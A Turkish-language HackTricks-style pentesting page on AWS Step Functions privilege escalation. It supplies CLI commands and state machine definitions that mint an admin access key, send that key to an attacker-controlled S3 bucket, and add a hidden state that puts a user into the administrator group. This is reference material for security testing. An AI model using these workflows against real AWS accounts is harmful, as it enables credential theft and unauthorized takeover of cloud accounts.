# AWS - Step Functions Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Step Functions

Bu AWS servisi hakkında daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### Görev Kaynakları

Bu privilege escalation techniques, istenen privilege escalation actions'ı gerçekleştirmek için bazı AWS Step Functions kaynaklarının kullanılmasını gerektirecektir.

Tüm olası eylemleri kontrol etmek için kendi AWS hesabınıza gidip kullanmak istediğiniz eylemi seçebilir ve kullandığı parametreleri şu örnekte olduğu gibi görebilirsiniz:

<figure><img src="../../../images/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

Veya AWS API belgelerine gidip her bir eylemin dokümantasyonunu inceleyebilirsiniz:

- [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API_AddUserToGroup.html)
- [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

**`states:TestState`** ve **`iam:PassRole`** izinlerine sahip bir saldırgan, mevcut bir state machine'i oluşturmadan veya güncellemeden herhangi bir state'i test edebilir ve ona herhangi bir IAM rolünü pass edebilir; bu, rollerin izinleriyle diğer AWS servislerine yetkisiz erişim sağlayabilir. Birlikte, bu izinler iş akışlarını manipüle etmekten veriyi değiştirmeye, veri ihlallerine, kaynak manipülasyonuna ve privilege escalation'a kadar geniş çaplı yetkisiz eylemlere yol açabilir.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Aşağıdaki örnekler, bu izinleri ve AWS ortamındaki geniş izinlere sahip bir rolü kullanarak **`admin`** kullanıcısı için bir access key oluşturan bir state'i nasıl test edeceğinizi gösterir. Bu geniş izinlere sahip rol, state'in **`iam:CreateAccessKey`** eylemini gerçekleştirmesine izin veren herhangi bir yüksek ayrıcalıklı politika ile ilişkilendirilmiş olmalıdır (örneğin **`arn:aws:iam::aws:policy/AdministratorAccess`**):

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Komut** privesc'i gerçekleştirmek için çalıştırıldı:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
**Potansiyel Etki**: İş akışlarının yetkisiz yürütülmesi ve manipülasyonu ile hassas kaynaklara erişim; potansiyel olarak ciddi güvenlik ihlallerine yol açabilir.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

**`states:CreateStateMachine`** ve **`iam:PassRole`** izinlerine sahip bir saldırgan, bir state machine oluşturup ona herhangi bir IAM rolü atayarak, bu rollerin izinleriyle diğer AWS servislerine yetkisiz erişim sağlayabilir. Önceki privesc tekniği (**`states:TestState`** & **`iam:PassRole`**) ile karşılaştırıldığında, bu teknik kendi başına çalışmaz; state machine üzerinde bir yürütmeyi başlatmak için ayrıca **`states:StartExecution`** veya **`states:StartSyncExecution`** izinlerine sahip olmanız gerekir (**`states:StartSyncExecution`** **standard workflows** için **mevcut değildir**, **just to express state machines**).
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Aşağıdaki örnekler, AWS ortamındaki izinleri ve izin verici bir rolü kullanarak **`admin`** kullanıcısı için bir access key oluşturan ve bu access key'i saldırgan kontrolündeki bir S3 bucket'ına sızdıran bir state machine'in nasıl oluşturulacağını gösterir. Bu izin verici rol, state machine'in **`iam:CreateAccessKey`** ve **`s3:putObject`** işlemlerini gerçekleştirmesine izin veren yüksek ayrıcalıklı bir policy ile ilişkilendirilmiş olmalıdır (örneğin **`arn:aws:iam::aws:policy/AdministratorAccess`**).

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Komut** **state machine oluşturmak için çalıştırıldı**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Komut** daha önce oluşturulmuş durum makinesinin bir yürütmesini başlatmak için çalıştırıldı:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
> [!WARNING]
> Saldırgan tarafından kontrol edilen S3 bucket, hedef hesaptan gelen bir s3:PutObject action'ını kabul etme izinlerine sahip olmalıdır.

**Olası Etki**: İş akışlarının yetkisiz yürütülmesi ve manipülasyonu ile hassas kaynaklara erişim; bu durum potansiyel olarak önemli güvenlik ihlallerine yol açabilir.

### `states:UpdateStateMachine` & (her zaman gerekli olmayabilir) `iam:PassRole`

**`states:UpdateStateMachine`** iznine sahip bir saldırgan, bir state machine'in tanımını değiştirebilir; privilege escalation ile sonuçlanabilecek ekstra gizli states ekleyebilir. Böylece meşru bir kullanıcı state machine'in execution'ını başlattığında, bu yeni kötü amaçlı gizli state çalıştırılacak ve privilege escalation başarılı olacaktır.

State machine ile ilişkili IAM Role'un ne kadar geniş yetkili olduğuna bağlı olarak, saldırgan 2 durumla karşılaşır:

1. **Geniş yetkili IAM Role**: Eğer state machine ile ilişkili IAM Role zaten geniş yetkiliyse (örneğin **`arn:aws:iam::aws:policy/AdministratorAccess`** policy'si iliştirilmişse), privilege escalation için **`iam:PassRole`** iznine gerek yoktur; çünkü IAM Role'u da güncellemek gerekli olmayacak, state machine tanımını değiştirmek yeterlidir.
2. **Sınırlı IAM Role**: Önceki durumun aksine, burada saldırganın ayrıca **`iam:PassRole`** iznine ihtiyacı olacaktır; çünkü state machine tanımını değiştirmeye ek olarak state machine'e geniş yetkili bir IAM Role iliştirmek gerekecektir.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Aşağıdaki örnekler, yalnızca bir HelloWorld Lambda function çağıran meşru bir state machine'i, ekstra bir state ekleyerek **`unprivilegedUser`** kullanıcısını **`administrator`** IAM Group'a ekleyecek şekilde nasıl güncelleyeceğinizi gösterir. Böylece, meşru bir kullanıcı güncellenmiş state machine'in yürütmesini başlattığında, bu yeni kötü amaçlı gizli state çalıştırılacak ve yetki yükseltme başarılı olacaktır.

> [!WARNING]
> Eğer state machine'e iliştirilmiş geniş izinlere sahip bir IAM Role yoksa, geniş izinlere sahip bir IAM Role'ü ilişkilendirmek için IAM Role'ü güncelleme amacıyla **`iam:PassRole`** izninin de gerekli olacaktır (örneğin **`arn:aws:iam::aws:policy/AdministratorAccess`** politikası eklenmiş bir role).

{{#tabs }}
{{#tab name="Legit State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}

{{#tab name="Malicious Updated State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}
{{#endtabs }}

- **Komut** yürütüldü **güncellemek** **meşru durum makinesini**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
**Olası Etki**: Yetkisiz iş akışlarının yürütülmesi ve manipülasyonu ile hassas kaynaklara erişim, potansiyel olarak önemli güvenlik ihlallerine yol açabilir.

{{#include ../../../../banners/hacktricks-training.md}}
